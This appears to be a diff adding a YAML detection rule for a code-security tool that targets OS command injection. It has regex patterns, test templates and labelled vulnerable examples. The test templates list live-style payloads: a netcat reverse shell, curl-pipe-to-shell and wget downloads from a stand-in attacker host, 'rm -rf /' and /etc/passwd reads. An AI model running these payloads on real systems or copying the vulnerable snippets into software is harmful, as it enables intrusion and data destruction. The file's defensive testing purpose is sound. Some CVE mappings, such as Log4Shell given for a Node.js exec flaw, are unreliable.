@@ -1,0 +1,432 @@
+id: command-injection
+version: 1
+name: Command Injection
+description: |
+  Detects OS command injection vulnerabilities where user input is passed to shell 
+  commands without proper sanitization. Attackers can execute arbitrary system 
+  commands, leading to complete server compromise. Use parameterized command 
+  execution (subprocess with list arguments) instead of shell interpolation.
+domain: security
+level: integration
+priority: P0
+severity: critical
+applicableLanguages:
+  - python
+  - typescript
+  - javascript
+
+cves:
+  - CVE-2021-44228
+  - CVE-2020-15778
+  - CVE-2022-22965
+
+references:
+  - https://owasp.org/www-community/attacks/Command_Injection
+  - https://cwe.mitre.org/data/definitions/78.html
+  - https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
+
+detectionPatterns:
+  # Python patterns
+  - id: python-os-system
+    type: regex
+    language: python
+    pattern: "os\\.system\\s*\\("
+    confidence: high
+    description: Detects os.system() which executes shell commands
+
+  - id: python-os-popen
+    type: regex
+    language: python
+    pattern: "os\\.popen\\s*\\("
+    confidence: high
+    description: Detects os.popen() which executes shell commands
+
+  - id: python-subprocess-shell
+    type: regex
+    language: python
+    pattern: "subprocess\\.(call|run|Popen|check_output)\\s*\\(.*shell\\s*=\\s*True"
+    confidence: high
+    description: Detects subprocess with shell=True
+
+  - id: python-subprocess-string
+    type: regex
+    language: python
+    pattern: "subprocess\\.(call|run|Popen|check_output)\\s*\\(\\s*[\"'f]"
+    confidence: medium
+    description: Detects subprocess with string command instead of list
+
+  - id: python-eval-exec
+    type: regex
+    language: python
+    pattern: "(eval|exec)\\s*\\(.*request\\.|compile\\s*\\(.*request\\."
+    confidence: high
+    description: Detects eval/exec with user input (code injection)
+
+  - id: python-commands-module
+    type: regex
+    language: python
+    pattern: "commands\\.(getoutput|getstatusoutput)\\s*\\("
+    confidence: high
+    description: Detects deprecated commands module (shell execution)
+
+  # TypeScript/JavaScript patterns
+  - id: ts-child-process-exec
+    type: regex
+    language: typescript
+    pattern: "child_process\\.exec\\s*\\(|exec\\s*\\(`.*\\$\\{"
+    confidence: high
+    description: Detects child_process.exec with potential user input
+
+  - id: ts-child-process-spawn-shell
+    type: regex
+    language: typescript
+    pattern: "spawn\\s*\\(.*shell:\\s*true"
+    confidence: high
+    description: Detects spawn with shell option enabled
+
+  - id: ts-execsync
+    type: regex
+    language: typescript
+    pattern: "execSync\\s*\\(`.*\\$\\{|execSync\\s*\\(.*\\+"
+    confidence: high
+    description: Detects execSync with string interpolation
+
+  - id: ts-eval-user-input
+    type: regex
+    language: typescript
+    pattern: "eval\\s*\\(.*req\\.|new Function\\s*\\(.*req\\."
+    confidence: high
+    description: Detects eval/Function with user input
+
+  - id: ts-shell-exec
+    type: regex
+    language: typescript
+    pattern: "shelljs\\.exec\\s*\\(|execa\\s*\\(.*shell:\\s*true"
+    confidence: high
+    description: Detects shelljs.exec or execa with shell mode
+
+testTemplates:
+  - id: pytest-command-injection
+    language: python
+    framework: pytest
+    template: |
+      import pytest
+      import subprocess
+      
+      
+      class Test{{className}}CommandInjection:
+          """Command injection tests for {{functionName}}"""
+          
+          COMMAND_INJECTION_PAYLOADS = [
+              "; cat /etc/passwd",
+              "| cat /etc/passwd",
+              "& cat /etc/passwd",
+              "`cat /etc/passwd`",
+              "$(cat /etc/passwd)",
+              "; rm -rf /",
+              "| nc attacker.com 4444 -e /bin/sh",
+              "'; ping -c 10 attacker.com; '",
+              "\" && curl http://attacker.com/shell.sh | sh && \"",
+              "\n/bin/sh -i",
+              "|| wget http://attacker.com/malware",
+          ]
+          
+          @pytest.mark.parametrize("payload", COMMAND_INJECTION_PAYLOADS)
+          def test_rejects_command_injection(self, payload, {{fixtures}}):
+              """Verify {{functionName}} rejects command injection attempts"""
+              with pytest.raises((ValueError, subprocess.SubprocessError, OSError, {{exceptionClass}})):
+                  {{functionCall}}(payload)
+          
+          @pytest.mark.parametrize("payload", COMMAND_INJECTION_PAYLOADS)
+          def test_no_shell_metacharacter_execution(self, payload, {{fixtures}}):
+              """Verify shell metacharacters don't execute commands"""
+              try:
+                  result = {{functionCall}}(payload)
+                  
+                  # If execution succeeded, verify no command was run
+                  if isinstance(result, str):
+                      assert "root:" not in result  # /etc/passwd content
+                      assert "PING" not in result.upper()  # ping output
+              except (ValueError, OSError, subprocess.SubprocessError):
+                  pass  # Expected behavior
+          
+          def test_uses_subprocess_list_args(self):
+              """Verify subprocess is called with list arguments, not string"""
+              import inspect
+              source = inspect.getsource({{functionReference}})
+              
+              # Should not use shell=True or os.system
+              assert "shell=True" not in source, "subprocess should not use shell=True"
+              assert "os.system" not in source, "Should use subprocess, not os.system"
+              assert "os.popen" not in source, "Should use subprocess, not os.popen"
+          
+          def test_input_validation(self, {{fixtures}}):
+              """Verify input is validated before command execution"""
+              # Test with various special characters
+              special_chars = [";", "|", "&", "`", "$", "(", ")", "{", "}", "<", ">", "\n"]
+              
+              for char in special_chars:
+                  input_with_char = f"safe_input{char}malicious"
+                  
+                  try:
+                      result = {{functionCall}}(input_with_char)
+                      # If succeeded, the special char should be escaped or rejected
+                      assert "malicious" not in str(result) or char in str(result)
+                  except (ValueError, OSError):
+                      pass  # Expected - input rejected
+          
+          def test_whitelist_approach(self, {{fixtures}}):
+              """Verify only whitelisted inputs are accepted"""
+              # Valid inputs should work
+              valid_inputs = {{validInputs}}
+              
+              for valid_input in valid_inputs:
+                  result = {{functionCall}}(valid_input)
+                  assert result is not None
+              
+              # Invalid format should be rejected
+              with pytest.raises(ValueError):
+                  {{functionCall}}("../../../invalid")
+    variables:
+      - name: className
+        type: string
+        description: Name of the class being tested
+        required: true
+      - name: functionName
+        type: string
+        description: Name of the function being tested
+        required: true
+      - name: functionCall
+        type: string
+        description: Full function call expression
+        required: true
+      - name: fixtures
+        type: string
+        description: pytest fixtures to inject
+        required: false
+        defaultValue: ""
+      - name: exceptionClass
+        type: string
+        description: Custom exception class
+        required: false
+        defaultValue: Exception
+      - name: functionReference
+        type: string
+        description: Reference to function for inspection
+        required: true
+      - name: validInputs
+        type: array
+        description: List of valid test inputs
+        required: false
+        defaultValue: '["test", "valid_input"]'
+
+  - id: jest-command-injection
+    language: typescript
+    framework: jest
+    template: |
+      import { {{functionName}} } from '{{modulePath}}';
+      import { execSync } from 'child_process';
+      
+      describe('{{className}} Command Injection Tests', () => {
+        const COMMAND_INJECTION_PAYLOADS = [
+          '; cat /etc/passwd',
+          '| cat /etc/passwd',
+          '& cat /etc/passwd',
+          '`cat /etc/passwd`',
+          '$(cat /etc/passwd)',
+          '; rm -rf /',
+          "'; ping -c 10 attacker.com; '",
+          '&& curl http://attacker.com/shell.sh | sh &&',
+        ];
+        
+        describe('rejects command injection payloads', () => {
+          test.each(COMMAND_INJECTION_PAYLOADS)(
+            'rejects payload: %s',
+            async (payload) => {
+              await expect({{functionCall}}(payload)).rejects.toThrow();
+            }
+          );
+        });
+        
+        describe('shell metacharacters', () => {
+          const specialChars = [';', '|', '&', '`', '$', '(', ')', '{', '}', '<', '>', '\n'];
+          
+          test.each(specialChars)(
+            'handles special character: %s',
+            async (char) => {
+              const input = `safe${char}malicious`;
+              
+              // Should either reject or escape the character
+              try {
+                const result = await {{functionCall}}(input);
+                
+                // If succeeded, verify no command was executed
+                expect(String(result)).not.toContain('root:');  // /etc/passwd
+              } catch (error) {
+                // Expected - input rejected
+                expect(error).toBeDefined();
+              }
+            }
+          );
+        });
+        
+        describe('safe execution', () => {
+          it('uses spawn with argument array, not exec with string', async () => {
+            // Mock to verify correct function is called
+            const spawnMock = jest.spyOn(require('child_process'), 'spawn');
+            const execMock = jest.spyOn(require('child_process'), 'exec');
+            
+            try {
+              await {{functionCall}}('valid_input');
+            } catch (e) {
+              // May fail, we just want to check which was called
+            }
+            
+            // Should use spawn (safe) not exec (unsafe)
+            expect(execMock).not.toHaveBeenCalled();
+            
+            spawnMock.mockRestore();
+            execMock.mockRestore();
+          });
+          
+          it('does not pass shell: true to spawn', async () => {
+            const spawnMock = jest.spyOn(require('child_process'), 'spawn');
+            
+            try {
+              await {{functionCall}}('valid_input');
+            } catch (e) {
+              // Ignore errors
+            }
+            
+            if (spawnMock.mock.calls.length > 0) {
+              const options = spawnMock.mock.calls[0]?.[2] || {};
+              expect(options.shell).not.toBe(true);
+            }
+            
+            spawnMock.mockRestore();
+          });
+        });
+        
+        describe('input validation', () => {
+          it('validates input format before execution', async () => {
+            // Valid inputs should succeed
+            const validInputs = {{validInputs}};
+            
+            for (const input of validInputs) {
+              await expect({{functionCall}}(input)).resolves.toBeDefined();
+            }
+          });
+          
+          it('rejects inputs with path traversal', async () => {
+            await expect({{functionCall}}('../../../etc/passwd')).rejects.toThrow();
+          });
+        });
+      });
+    variables:
+      - name: className
+        type: string
+        description: Name of the class or module being tested
+        required: true
+      - name: functionName
+        type: string
+        description: Name of the function being tested
+        required: true
+      - name: functionCall
+        type: string
+        description: Full function call expression
+        required: true
+      - name: modulePath
+        type: string
+        description: Import path for the module
+        required: true
+      - name: validInputs
+        type: array
+        description: List of valid test inputs
+        required: false
+        defaultValue: '["test", "valid_input"]'
+
+examples:
+  - name: python-os-system
+    concept: |
+      Command injection via os.system(). This function passes the entire string 
+      to the shell, allowing metacharacter injection. Use subprocess.run() with 
+      a list of arguments instead.
+    vulnerableCode: |
+      import os
+      
+      def ping_host(hostname):
+          # VULNERABLE: Shell injection via string concatenation
+          os.system(f"ping -c 4 {hostname}")
+    testCode: |
+      import pytest
+      
+      def test_ping_rejects_injection():
+          """Verify ping command rejects shell injection"""
+          with pytest.raises(ValueError):
+              ping_host("; cat /etc/passwd")
+      
+      def test_ping_uses_subprocess_safely():
+          """Verify subprocess is used with list args"""
+          # Should be implemented as:
+          # subprocess.run(["ping", "-c", "4", hostname], check=True)
+          import subprocess
+          result = subprocess.run(["ping", "-c", "1", "localhost"], capture_output=True)
+          assert result.returncode == 0
+    language: python
+    severity: critical
+    cve: CVE-2020-15778
+
+  - name: python-subprocess-shell-true
+    concept: |
+      Command injection via subprocess with shell=True. Even with subprocess, 
+      using shell=True passes the command through the shell, enabling injection. 
+      Always use shell=False (default) with a list of arguments.
+    vulnerableCode: |
+      import subprocess
+      
+      def convert_file(filename):
+          # VULNERABLE: shell=True allows injection
+          subprocess.run(f"convert {filename} output.png", shell=True)
+    testCode: |
+      import pytest
+      
+      def test_convert_no_shell_injection():
+          """Verify file conversion rejects shell metacharacters"""
+          with pytest.raises(ValueError):
+              convert_file("input.jpg; rm -rf /")
+    language: python
+    severity: critical
+
+  - name: nodejs-exec-injection
+    concept: |
+      Command injection via Node.js child_process.exec(). The exec function 
+      spawns a shell and is vulnerable to injection. Use spawn() or execFile() 
+      with an array of arguments instead.
+    vulnerableCode: |
+      const { exec } = require('child_process');
+      
+      function resizeImage(filename, size) {
+        // VULNERABLE: Shell injection via template literal
+        exec(`convert ${filename} -resize ${size} output.jpg`, (err, stdout) => {
+          console.log(stdout);
+        });
+      }
+    testCode: |
+      describe('resizeImage', () => {
+        it('rejects shell metacharacters', async () => {
+          await expect(
+            resizeImage('image.jpg; cat /etc/passwd', '100x100')
+          ).rejects.toThrow();
+        });
+        
+        it('uses spawn instead of exec', () => {
+          // Implementation should use:
+          // spawn('convert', [filename, '-resize', size, 'output.jpg'])
+        });
+      });
+    language: typescript
+    severity: critical
+    cve: CVE-2021-44228
+
+createdAt: 2024-01-01
+updatedAt: 2024-01-01
